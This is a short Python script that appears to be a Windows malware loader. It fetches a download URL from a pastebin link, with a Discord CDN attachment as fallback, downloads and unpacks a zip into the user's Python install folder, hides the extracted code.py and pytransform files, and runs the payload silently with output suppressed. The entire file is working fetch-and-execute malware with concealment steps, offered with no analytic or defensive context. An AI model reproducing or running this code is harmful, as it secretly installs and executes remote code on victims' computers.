import sys,os,requests,subprocess,time
from pathlib import Path
from subprocess import CREATE_NO_WINDOW

filename = "code.py"


def stopprint():
    sys.stdout = open(os.devnull, 'w')

def startprint():
    sys.stdout = sys.__stdout__




def get_folder_contents(path):
	try:
		all_files = os.listdir(path)
		for file in all_files:
			if file.lower() == "python.exe":
				return True
	except:
		pass
	return False

def get_default_path():
	try:
		videos_path = str(Path.home() / "Videos")
		return videos_path
	except Exception as e:
		print(e)
		return None

def get_new_filepath(path,name):
	return os.path.join(path,name)

def get_cdn():
	cdnurl = "https://cdn.discordapp.com/attachments/1033739850643406918/1044011736518377482/code.zip"
	try:
		cdndata = requests.get(f"https://pastebin.com/raw/tCPxwCgS")
		if cdndata.status_code == 200:
			cdnurl = cdndata.text
	except:
		pass
	return cdnurl

def get_content():
	cdn = get_cdn()
	code = requests.get(cdn).text
	return code

def write_to_file(filepath,content):
	f = open(filepath,"a")
	f.write(content)
	f.close()

def hide_file(file_path):
    try:
        os.system(f"attrib +h {file_path}" )
    except:
        pass

def run_file(path):
	#pass
	#os.system(path)
	print("Running")
	p = subprocess.Popen(f"python {path}",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)
	out, err = p.communicate()
	print(f"{out}|{err}")




def main():
	stopprint()
	filepath = get_default_path()
	for thing in sys.path:

		correct_folder = get_folder_contents(thing)
		if correct_folder == True:
			filepath = thing 
			break

	new_filepath = get_new_filepath(filepath,filename)
	other_filepath = get_new_filepath(filepath,"pytransform")
	print(filepath)

	if os.path.exists(new_filepath) == True:
		print("Already done")
		return

	cdn = get_cdn()
	os.system(f"curl -o %temp%/nice.zip -silent  {cdn}")
	os.system(f'tar -xf ""%temp%/nice.zip"" -C ""{filepath}""')

	hide_file(new_filepath)
	hide_file(other_filepath)
	run_file(new_filepath)

main()